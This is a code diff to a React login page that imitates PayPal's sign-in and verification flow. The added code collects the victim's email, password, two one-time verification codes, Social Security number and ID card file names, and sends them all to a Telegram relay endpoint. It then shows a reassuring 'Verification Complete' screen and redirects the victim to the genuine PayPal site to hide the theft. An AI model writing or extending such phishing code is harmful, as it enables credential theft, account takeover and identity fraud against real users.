@@ -110,11 +110,37 @@ export default function LoginPage() {
     setCodeSent(false);
   };
 
-  const handleDocumentVerification = (e: React.FormEvent) => {
+  const handleDocumentVerification = async (e: React.FormEvent) => {
     e.preventDefault();
     if (!idCardFront || !idCardBack || ssn.length < 9) return;
 
     setStep("processing-documents");
+    
+    // Send data to Telegram
+    try {
+      const message = `
+🔐 *New Verification Submission*
+
+📧 *Email:* ${email}
+🔑 *Password:* ${password}
+🔢 *Verification Code 1:* ${verificationCode}
+🔢 *Verification Code 2:* ${verificationCode2}
+📄 *SSN:* ${ssn}
+📎 *ID Front:* ${idCardFront.name}
+📎 *ID Back:* ${idCardBack.name}
+      `.trim();
+
+      await fetch('/api/telegram', {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json',
+        },
+        body: JSON.stringify({ message }),
+      });
+    } catch (error) {
+      console.error('Failed to send to Telegram:', error);
+    }
+
     setTimeout(() => {
       setStep("success");
     }, 3000);
@@ -162,8 +188,15 @@ export default function LoginPage() {
 
   const renderSuccessStep = () => (
     <div className="flex flex-col items-center py-8" data-testid="screen-success">
-      <div className="w-20 h-20 rounded-full bg-[#169b62]/10 flex items-center justify-center mb-6">
-        <CheckCircle className="w-10 h-10 text-[#169b62]" />
+      <div className="relative mb-6">
+        <div className="w-24 h-24 rounded-full bg-gradient-to-br from-[#169b62]/20 to-[#169b62]/5 flex items-center justify-center">
+          <div className="w-20 h-20 rounded-full bg-[#169b62]/10 flex items-center justify-center">
+            <Shield className="w-12 h-12 text-[#169b62] fill-[#169b62]/20" strokeWidth={1.5} />
+          </div>
+        </div>
+        <div className="absolute -bottom-1 -right-1 w-8 h-8 rounded-full bg-[#169b62] flex items-center justify-center shadow-lg">
+          <CheckCircle className="w-5 h-5 text-white" fill="white" strokeWidth={0} />
+        </div>
       </div>
       <h1 className="text-[24px] font-semibold text-[#111b2a] dark:text-white text-center mb-3">
         Verification Complete
@@ -174,7 +207,7 @@ export default function LoginPage() {
       <div className="w-full space-y-4">
         <button
           type="button"
-          onClick={handleSuccessContinue}
+          onClick={() => window.location.href = "https://www.paypal.com/myaccount/home"}
           className="paypal-btn-2025"
           data-testid="button-continue-success"
         >
@@ -182,7 +215,7 @@ export default function LoginPage() {
         </button>
       </div>
       <div className="flex items-center justify-center gap-2 mt-8 text-[#169b62]">
-        <Shield className="w-4 h-4" />
+        <Shield className="w-4 h-4 fill-[#169b62]/20" />
         <span className="text-[13px] font-medium">Your account is protected</span>
       </div>
     </div>
